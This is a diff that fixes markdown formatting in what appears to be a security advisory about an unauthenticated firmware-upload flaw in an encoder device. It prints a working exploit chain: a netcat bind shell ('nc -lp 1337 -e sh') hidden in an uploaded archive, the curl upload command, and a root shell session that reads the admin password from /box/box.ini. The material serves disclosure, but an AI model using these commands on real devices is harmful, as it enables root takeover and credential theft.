@@ -1039,8 +1039,8 @@ Pathname/Comment  Size   Packed Ratio  Date   Time     Attr      CRC   Meth Ver
 This embedded script `uk.txt` contains a single command:
 
 ```
-`$ cat uk.txt
-nc -lp 1337 -e sh`
+$ cat uk.txt
+nc -lp 1337 -e sh
 ```
 
 This command will open a `netcat` listener with a shell on port 1337, allowing an attacker to connect to the device as root and execute arbitrary commands in the shell.
@@ -1052,18 +1052,18 @@ echo "UmFyIRoHAM+QcwAADQAAAAAAAAAYlHQgkCsAEwAAABMAAAACUZO4Wm9A4lAdMAYAgAAAAHVrLn
 
 2. Use `curl` command to upload the file to the device:
 ```
-`curl -s -F 'upgrade=@uk.rar' http://encoder >/dev/null`
+curl -s -F 'upgrade=@uk.rar' http://encoder >/dev/null
 ```
 Note that the command above does not include any user credentials, i.e. this is an unauthenticated upload.
 
 3. Use `nc` (netcat) command to connect to the device on port 1337 and execute any commands as root. For example, you can retrieve the actual admin password stored in `/box/box.ini`:
 ```
-`$ ``nc encoder 1337`
-`sh -i`
-`# ``whoami`
-`root`
-`# ``grep html_password /box/box.ini`
-`html_password:`**`s3cr3t`**
+$ nc encoder 1337
+sh -i
+# whoami
+root
+# grep html_password /box/box.ini
+html_password:s3cr3t
 ```
 
 The device will reboot when you disconnect the netcat session. This is working as designed - see the call to `box_Reboot()`.
